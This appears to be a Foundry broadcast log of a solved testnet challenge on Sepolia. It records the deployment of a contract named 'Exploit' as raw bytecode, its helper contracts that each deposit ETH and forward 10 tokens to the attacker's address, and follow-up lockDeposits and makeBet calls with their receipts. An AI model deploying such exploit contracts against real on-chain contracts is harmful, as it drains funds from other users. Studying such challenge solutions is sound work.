{
  "transactions": [
    {
      "hash": "0x834cd69a02d37dbd02ec6e18afad44ae2676a246c8388eb8bb8157af6f54dabb",
      "transactionType": "CREATE",
      "contractName": "Exploit",
      "contractAddress": "0x56e548bc36cff1df1db78ebd7056eb9549d0abde",
      "function": null,
      "arguments": null,
      "transaction": {
        "from": "0x965b0e63e00e7805569ee3b428cf96330dfc57ef",
        "gas": "0x9d789",
        "value": "0x0",
        "input": "0x6080604052348015600e575f5ffd5b506108058061001c5f395ff3fe60806040526004361061001d575f3560e01c806353d0489c14610021575b5f5ffd5b61003b6004803603810190610036919061022b565b61003d565b005b66071afd498d00003414610086576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161007d906102c3565b60405180910390fd5b5f604051610093906101c0565b604051809103905ff0801580156100ac573d5f5f3e3d5ffd5b5090505f6040516100bc906101c0565b604051809103905ff0801580156100d5573d5f5f3e3d5ffd5b5090508173ffffffffffffffffffffffffffffffffffffffff1663f9609f0866038d7ea4c6800086866040518463ffffffff1660e01b815260040161011b9291906102f0565b5f604051808303818588803b158015610132575f5ffd5b505af1158015610144573d5f5f3e3d5ffd5b50505050508073ffffffffffffffffffffffffffffffffffffffff1663f9609f0866038d7ea4c6800086866040518463ffffffff1660e01b815260040161018c9291906102f0565b5f604051808303818588803b1580156101a3575f5ffd5b505af11580156101b5573d5f5f3e3d5ffd5b505050505050505050565b6104b88061031883390190565b5f5ffd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6101fa826101d1565b9050919050565b61020a816101f0565b8114610214575f5ffd5b50565b5f8135905061022581610201565b92915050565b5f5f60408385031215610241576102406101cd565b5b5f61024e85828601610217565b925050602061025f85828601610217565b9150509250929050565b5f82825260208201905092915050565b7f496e76616c6964206465706f73697420616d6f756e74000000000000000000005f82015250565b5f6102ad601683610269565b91506102b882610279565b602082019050919050565b5f6020820190508181035f8301526102da816102a1565b9050919050565b6102ea816101f0565b82525050565b5f6040820190506103035f8301856102e1565b61031060208301846102e1565b939250505056fe6080604052348015600e575f5ffd5b5061049c8061001c5f395ff3fe60806040526004361061001d575f3560e01c8063f9609f0814610021575b5f5ffd5b61003b6004803603810190610036919061023e565b61003d565b005b66038d7ea4c680003414610086576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161007d906102d6565b60405180910390fd5b5f8290508073ffffffffffffffffffffffffffffffffffffffff1663b6b55f25345f6040518363ffffffff1660e01b81526004016100c4919061033f565b5f604051808303818588803b1580156100db575f5ffd5b505af11580156100ed573d5f5f3e3d5ffd5b50505050508073ffffffffffffffffffffffffffffffffffffffff1663996c6cc36040518163ffffffff1660e01b8152600401602060405180830381865afa15801561013b573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061015f919061036c565b73ffffffffffffffffffffffffffffffffffffffff1663a9059cbb83600a6040518363ffffffff1660e01b815260040161019a9291906103df565b6020604051808303815f875af11580156101b6573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906101da919061043b565b50505050565b5f5ffd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f61020d826101e4565b9050919050565b61021d81610203565b8114610227575f5ffd5b50565b5f8135905061023881610214565b92915050565b5f5f60408385031215610254576102536101e0565b5b5f6102618582860161022a565b92505060206102728582860161022a565b9150509250929050565b5f82825260208201905092915050565b7f496e76616c6964206465706f73697420616d6f756e74000000000000000000005f82015250565b5f6102c060168361027c565b91506102cb8261028c565b602082019050919050565b5f6020820190508181035f8301526102ed816102b4565b9050919050565b5f819050919050565b5f819050919050565b5f819050919050565b5f61032961032461031f846102f4565b610306565b6102fd565b9050919050565b6103398161030f565b82525050565b5f6020820190506103525f830184610330565b92915050565b5f8151905061036681610214565b92915050565b5f60208284031215610381576103806101e0565b5b5f61038e84828501610358565b91505092915050565b6103a081610203565b82525050565b5f819050919050565b5f6103c96103c46103bf846103a6565b610306565b6102fd565b9050919050565b6103d9816103af565b82525050565b5f6040820190506103f25f830185610397565b6103ff60208301846103d0565b9392505050565b5f8115159050919050565b61041a81610406565b8114610424575f5ffd5b50565b5f8151905061043581610411565b92915050565b5f602082840312156104505761044f6101e0565b5b5f61045d84828501610427565b9150509291505056fea26469706673582212202476c36a97b57a28548d7a3cc67a81e3e55b6b847145e42d62b354ca6993f09b64736f6c634300081d0033a2646970667358221220ae8bf4be0e9e2796a36041e998984610e09e0b370b71a3ec291863381a83d73c64736f6c634300081d0033",
        "nonce": "0x2a7",
        "chainId": "0xaa36a7"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": "0x764c5e31d75e5025dcd4bd48ea2e650d341a6cdf2b0b64a0edb1a3aa5d5be67b",
      "transactionType": "CALL",
      "contractName": "Exploit",
      "contractAddress": "0x56e548bc36cff1df1db78ebd7056eb9549d0abde",
      "function": "exploit(address,address)",
      "arguments": [
        "0x5f74D38619852d4a8F538F35eFA8b93099c9196E",
        "0x965B0E63e00E7805569ee3B428Cf96330DFc57EF"
      ],
      "transaction": {
        "from": "0x965b0e63e00e7805569ee3b428cf96330dfc57ef",
        "to": "0x56e548bc36cff1df1db78ebd7056eb9549d0abde",
        "gas": "0xff2e4",
        "value": "0x71afd498d0000",
        "input": "0x53d0489c0000000000000000000000005f74d38619852d4a8f538f35efa8b93099c9196e000000000000000000000000965b0e63e00e7805569ee3b428cf96330dfc57ef",
        "nonce": "0x2a8",
        "chainId": "0xaa36a7"
      },
      "additionalContracts": [
        {
          "transactionType": "CREATE",
          "address": "0x17ee25c0f5f4ecdda114bd0a2b8ca8ef61311c65",
          "initCode": "0x6080604052348015600e575f5ffd5b5061049c8061001c5f395ff3fe60806040526004361061001d575f3560e01c8063f9609f0814610021575b5f5ffd5b61003b6004803603810190610036919061023e565b61003d565b005b66038d7ea4c680003414610086576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161007d906102d6565b60405180910390fd5b5f8290508073ffffffffffffffffffffffffffffffffffffffff1663b6b55f25345f6040518363ffffffff1660e01b81526004016100c4919061033f565b5f604051808303818588803b1580156100db575f5ffd5b505af11580156100ed573d5f5f3e3d5ffd5b50505050508073ffffffffffffffffffffffffffffffffffffffff1663996c6cc36040518163ffffffff1660e01b8152600401602060405180830381865afa15801561013b573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061015f919061036c565b73ffffffffffffffffffffffffffffffffffffffff1663a9059cbb83600a6040518363ffffffff1660e01b815260040161019a9291906103df565b6020604051808303815f875af11580156101b6573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906101da919061043b565b50505050565b5f5ffd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f61020d826101e4565b9050919050565b61021d81610203565b8114610227575f5ffd5b50565b5f8135905061023881610214565b92915050565b5f5f60408385031215610254576102536101e0565b5b5f6102618582860161022a565b92505060206102728582860161022a565b9150509250929050565b5f82825260208201905092915050565b7f496e76616c6964206465706f73697420616d6f756e74000000000000000000005f82015250565b5f6102c060168361027c565b91506102cb8261028c565b602082019050919050565b5f6020820190508181035f8301526102ed816102b4565b9050919050565b5f819050919050565b5f819050919050565b5f819050919050565b5f61032961032461031f846102f4565b610306565b6102fd565b9050919050565b6103398161030f565b82525050565b5f6020820190506103525f830184610330565b92915050565b5f8151905061036681610214565b92915050565b5f60208284031215610381576103806101e0565b5b5f61038e84828501610358565b91505092915050565b6103a081610203565b82525050565b5f819050919050565b5f6103c96103c46103bf846103a6565b610306565b6102fd565b9050919050565b6103d9816103af565b82525050565b5f6040820190506103f25f830185610397565b6103ff60208301846103d0565b9392505050565b5f8115159050919050565b61041a81610406565b8114610424575f5ffd5b50565b5f8151905061043581610411565b92915050565b5f602082840312156104505761044f6101e0565b5b5f61045d84828501610427565b9150509291505056fea26469706673582212202476c36a97b57a28548d7a3cc67a81e3e55b6b847145e42d62b354ca6993f09b64736f6c634300081d0033"
        },
        {
          "transactionType": "CREATE",
          "address": "0x82fcaf450e97657f84a80847edd476276048018b",
          "initCode": "0x6080604052348015600e575f5ffd5b5061049c8061001c5f395ff3fe60806040526004361061001d575f3560e01c8063f9609f0814610021575b5f5ffd5b61003b6004803603810190610036919061023e565b61003d565b005b66038d7ea4c680003414610086576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161007d906102d6565b60405180910390fd5b5f8290508073ffffffffffffffffffffffffffffffffffffffff1663b6b55f25345f6040518363ffffffff1660e01b81526004016100c4919061033f565b5f604051808303818588803b1580156100db575f5ffd5b505af11580156100ed573d5f5f3e3d5ffd5b50505050508073ffffffffffffffffffffffffffffffffffffffff1663996c6cc36040518163ffffffff1660e01b8152600401602060405180830381865afa15801561013b573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061015f919061036c565b73ffffffffffffffffffffffffffffffffffffffff1663a9059cbb83600a6040518363ffffffff1660e01b815260040161019a9291906103df565b6020604051808303815f875af11580156101b6573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906101da919061043b565b50505050565b5f5ffd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f61020d826101e4565b9050919050565b61021d81610203565b8114610227575f5ffd5b50565b5f8135905061023881610214565b92915050565b5f5f60408385031215610254576102536101e0565b5b5f6102618582860161022a565b92505060206102728582860161022a565b9150509250929050565b5f82825260208201905092915050565b7f496e76616c6964206465706f73697420616d6f756e74000000000000000000005f82015250565b5f6102c060168361027c565b91506102cb8261028c565b602082019050919050565b5f6020820190508181035f8301526102ed816102b4565b9050919050565b5f819050919050565b5f819050919050565b5f819050919050565b5f61032961032461031f846102f4565b610306565b6102fd565b9050919050565b6103398161030f565b82525050565b5f6020820190506103525f830184610330565b92915050565b5f8151905061036681610214565b92915050565b5f60208284031215610381576103806101e0565b5b5f61038e84828501610358565b91505092915050565b6103a081610203565b82525050565b5f819050919050565b5f6103c96103c46103bf846103a6565b610306565b6102fd565b9050919050565b6103d9816103af565b82525050565b5f6040820190506103f25f830185610397565b6103ff60208301846103d0565b9392505050565b5f8115159050919050565b61041a81610406565b8114610424575f5ffd5b50565b5f8151905061043581610411565b92915050565b5f602082840312156104505761044f6101e0565b5b5f61045d84828501610427565b9150509291505056fea26469706673582212202476c36a97b57a28548d7a3cc67a81e3e55b6b847145e42d62b354ca6993f09b64736f6c634300081d0033"
        }
      ],
      "isFixedGasLimit": false
    },
    {
      "hash": "0x127ae601d7226570d28308627013f9cf59ef00f51897d80ccbd54cc43e38ef75",
      "transactionType": "CALL",
      "contractName": null,
      "contractAddress": "0x5f74d38619852d4a8f538f35efa8b93099c9196e",
      "function": "lockDeposits()",
      "arguments": [],
      "transaction": {
        "from": "0x965b0e63e00e7805569ee3b428cf96330dfc57ef",
        "to": "0x5f74d38619852d4a8f538f35efa8b93099c9196e",
        "gas": "0xea71",
        "value": "0x0",
        "input": "0xd088a231",
        "nonce": "0x2a9",
        "chainId": "0xaa36a7"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": "0x7386d1a553eed2970396af1bae70dc4db925cb12daf33722b8c53a3915a9132a",
      "transactionType": "CALL",
      "contractName": null,
      "contractAddress": "0xba8192b7865310cd5229de75bd67d47e91bf30d0",
      "function": "makeBet(address)",
      "arguments": [
        "0x965B0E63e00E7805569ee3B428Cf96330DFc57EF"
      ],
      "transaction": {
        "from": "0x965b0e63e00e7805569ee3b428cf96330dfc57ef",
        "to": "0xba8192b7865310cd5229de75bd67d47e91bf30d0",
        "gas": "0x142f1",
        "value": "0x0",
        "input": "0x880c4270000000000000000000000000965b0e63e00e7805569ee3b428cf96330dfc57ef",
        "nonce": "0x2aa",
        "chainId": "0xaa36a7"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    }
  ],
  "receipts": [
    {
      "status": "0x1",
      "cumulativeGasUsed": "0x147dd69",
      "logs": [],
      "logsBloom": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
      "type": "0x2",
      "transactionHash": "0x834cd69a02d37dbd02ec6e18afad44ae2676a246c8388eb8bb8157af6f54dabb",
      "transactionIndex": "0x3c",
      "blockHash": "0x21276553f8ba569979dc0f7274f1a78dee1f3cf2c8e537887d13a0f9ec4e89a4",
      "blockNumber": "0x8d1602",
      "gasUsed": "0x7921b",
      "effectiveGasPrice": "0xf42d0",
      "from": "0x965b0e63e00e7805569ee3b428cf96330dfc57ef",
      "to": null,
      "contractAddress": "0x56e548bc36cff1df1db78ebd7056eb9549d0abde"
    },
    {
      "status": "0x1",
      "cumulativeGasUsed": "0x15c454e",
      "logs": [
        {
          "address": "0x9af5ca376dcdcbc622736258b302b92fecd3fecd",
          "topics": [
            "0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef",
            "0x0000000000000000000000000000000000000000000000000000000000000000",
            "0x00000000000000000000000017ee25c0f5f4ecdda114bd0a2b8ca8ef61311c65"
          ],
          "data": "0x000000000000000000000000000000000000000000000000000000000000000a",
          "blockHash": "0xa840ba4e7a38ffceb000ce8d0ef301c2f21217842b35bc202207ae048d63f5f8",
          "blockNumber": "0x8d1603",
          "blockTimestamp": "0x68cf74ec",
          "transactionHash": "0x764c5e31d75e5025dcd4bd48ea2e650d341a6cdf2b0b64a0edb1a3aa5d5be67b",
          "transactionIndex": "0x5c",
          "logIndex": "0xdc",
          "removed": false
        },
        {
          "address": "0x9af5ca376dcdcbc622736258b302b92fecd3fecd",
          "topics": [
            "0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef",
            "0x00000000000000000000000017ee25c0f5f4ecdda114bd0a2b8ca8ef61311c65",
            "0x000000000000000000000000965b0e63e00e7805569ee3b428cf96330dfc57ef"
          ],
          "data": "0x000000000000000000000000000000000000000000000000000000000000000a",
          "blockHash": "0xa840ba4e7a38ffceb000ce8d0ef301c2f21217842b35bc202207ae048d63f5f8",
          "blockNumber": "0x8d1603",
          "blockTimestamp": "0x68cf74ec",
          "transactionHash": "0x764c5e31d75e5025dcd4bd48ea2e650d341a6cdf2b0b64a0edb1a3aa5d5be67b",
          "transactionIndex": "0x5c",
          "logIndex": "0xdd",
          "removed": false
        },
        {
          "address": "0x9af5ca376dcdcbc622736258b302b92fecd3fecd",
          "topics": [
            "0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef",
            "0x0000000000000000000000000000000000000000000000000000000000000000",
            "0x00000000000000000000000082fcaf450e97657f84a80847edd476276048018b"
          ],
          "data": "0x000000000000000000000000000000000000000000000000000000000000000a",
          "blockHash": "0xa840ba4e7a38ffceb000ce8d0ef301c2f21217842b35bc202207ae048d63f5f8",
          "blockNumber": "0x8d1603",
          "blockTimestamp": "0x68cf74ec",
          "transactionHash": "0x764c5e31d75e5025dcd4bd48ea2e650d341a6cdf2b0b64a0edb1a3aa5d5be67b",
          "transactionIndex": "0x5c",
          "logIndex": "0xde",
          "removed": false
        },
        {
          "address": "0x9af5ca376dcdcbc622736258b302b92fecd3fecd",
          "topics": [
            "0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef",
            "0x00000000000000000000000082fcaf450e97657f84a80847edd476276048018b",
            "0x000000000000000000000000965b0e63e00e7805569ee3b428cf96330dfc57ef"
          ],
          "data": "0x000000000000000000000000000000000000000000000000000000000000000a",
          "blockHash": "0xa840ba4e7a38ffceb000ce8d0ef301c2f21217842b35bc202207ae048d63f5f8",
          "blockNumber": "0x8d1603",
          "blockTimestamp": "0x68cf74ec",
          "transactionHash": "0x764c5e31d75e5025dcd4bd48ea2e650d341a6cdf2b0b64a0edb1a3aa5d5be67b",
          "transactionIndex": "0x5c",
          "logIndex": "0xdf",
          "removed": false
        }
      ],
      "logsBloom": "0x00000000000000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000008000000000000000020000000000000000002000000020008000004100000000000000000000000000000000000000000020000000000000000000800000000000000000000000010000000040000000000000022000000000000000020000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000000",
      "type": "0x2",
      "transactionHash": "0x764c5e31d75e5025dcd4bd48ea2e650d341a6cdf2b0b64a0edb1a3aa5d5be67b",
      "transactionIndex": "0x5c",
      "blockHash": "0xa840ba4e7a38ffceb000ce8d0ef301c2f21217842b35bc202207ae048d63f5f8",
      "blockNumber": "0x8d1603",
      "gasUsed": "0xae7b9",
      "effectiveGasPrice": "0xf42cc",
      "from": "0x965b0e63e00e7805569ee3b428cf96330dfc57ef",
      "to": "0x56e548bc36cff1df1db78ebd7056eb9549d0abde",
      "contractAddress": null
    },
    {
      "status": "0x1",
      "cumulativeGasUsed": "0x10500a4",
      "logs": [],
      "logsBloom": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
      "type": "0x2",
      "transactionHash": "0x127ae601d7226570d28308627013f9cf59ef00f51897d80ccbd54cc43e38ef75",
      "transactionIndex": "0x4c",
      "blockHash": "0xc82759f374832e6af6fd1c9c425b672dbb6e24643a3f7f3167704e99e3b3fb32",
      "blockNumber": "0x8d1604",
      "gasUsed": "0xa9bc",
      "effectiveGasPrice": "0xf42dd",
      "from": "0x965b0e63e00e7805569ee3b428cf96330dfc57ef",
      "to": "0x5f74d38619852d4a8f538f35efa8b93099c9196e",
      "contractAddress": null
    },
    {
      "status": "0x1",
      "cumulativeGasUsed": "0x101d0fc",
      "logs": [],
      "logsBloom": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
      "type": "0x2",
      "transactionHash": "0x7386d1a553eed2970396af1bae70dc4db925cb12daf33722b8c53a3915a9132a",
      "transactionIndex": "0x4c",
      "blockHash": "0x0b9dc6733be0fbff27a23fe3eb9aad1e4c43707a56d5d106a65802f8486ca467",
      "blockNumber": "0x8d1605",
      "gasUsed": "0xe9cf",
      "effectiveGasPrice": "0xf42db",
      "from": "0x965b0e63e00e7805569ee3b428cf96330dfc57ef",
      "to": "0xba8192b7865310cd5229de75bd67d47e91bf30d0",
      "contractAddress": null
    }
  ],
  "libraries": [],
  "pending": [],
  "returns": {},
  "timestamp": 1758426372689,
  "chain": 11155111,
  "commit": "000ae59"
}